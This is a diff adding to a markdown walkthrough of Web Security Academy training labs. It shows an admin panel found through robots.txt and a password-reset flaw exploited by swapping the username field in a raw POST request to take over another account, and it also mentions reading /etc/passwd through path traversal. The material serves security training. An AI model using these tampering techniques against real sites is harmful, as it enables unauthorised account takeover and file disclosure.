@@ -282,3 +282,84 @@ Well, a jucy spot for path traversal. We try to read `/etc/passwd`:
 <p align="center">
   <img width=550 height=500 src="/img/img9.png"><br/>
 </p>
+
+## Access control and privilege escalation:
+
+### Lab: Unprotected admin functionality
+
+Well, the title says it, now, we have to find it. One option is to bruteforce it, another, `robots.txt`:
+
+<p align="center">
+  <img width=550 height=500 src="/img/img10.png"><br/>
+</p>
+
+Well, there it's. And guess, no password is needed:
+
+<p align="center">
+  <img width=550 height=500 src="/img/img11.png"><br/>
+</p>
+
+Magic.
+
+## Broken Authentication:
+
+### Lab: Password reset broken logic
+
+**Description**:
+
+```
+This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
+
+- Your credentials: wiener:peter
+- Victim's username: carlos
+```
+
+We examine the password reset functionality. HTTP Request:
+
+```http
+POST /forgot-password HTTP/2
+Host: 0a5c005504517f05829148910051005f.web-security-academy.net
+Cookie: session=CXcBvvgQnLlnhSTTHNEZsweR1EGyNCU5
+Content-Length: 15
+Content-Type: application/x-www-form-urlencoded
+
+username=wiener
+```
+
+In the provided attacker email, we get the following email:
+
+```
+Sent:     2024-02-16 17:48:40 +0000
+From:     "No reply" <no-reply@0a5c005504517f05829148910051005f.web-security-academy.net>
+To:       "wiener" <wiener@exploit-0a080083042a7faa829047d4013c0014.exploit-server.net>
+Subject:  Account recovery
+
+Hello!
+
+Please follow the link below to reset your password.
+
+https://0a5c005504517f05829148910051005f.web-security-academy.net/forgot-password?temp-forgot-password-token=6lvbwhs5szb626p8y6pbr3xw0sx39oda
+
+Thanks,
+Support team
+```
+
+Visiting the link & trying to update our password, we get the following request:
+
+```
+POST /forgot-password?temp-forgot-password-token=6lvbwhs5szb626p8y6pbr3xw0sx39oda HTTP/2
+Host: 0a5c005504517f05829148910051005f.web-security-academy.net
+Cookie: session=CXcBvvgQnLlnhSTTHNEZsweR1EGyNCU5
+Content-Length: 119
+Content-Type: application/x-www-form-urlencoded
+
+temp-forgot-password-token=6lvbwhs5szb626p8y6pbr3xw0sx39oda&username=wiener&new-password-1=123456&new-password-2=123456
+```
+
+We see that our username `username` is sent in the requet. We try to change it to `carlos`:
+
+<p align="center">
+  <img width=550 height=200 src="/img/img12.png"><br/>
+</p>
+
+Changed!
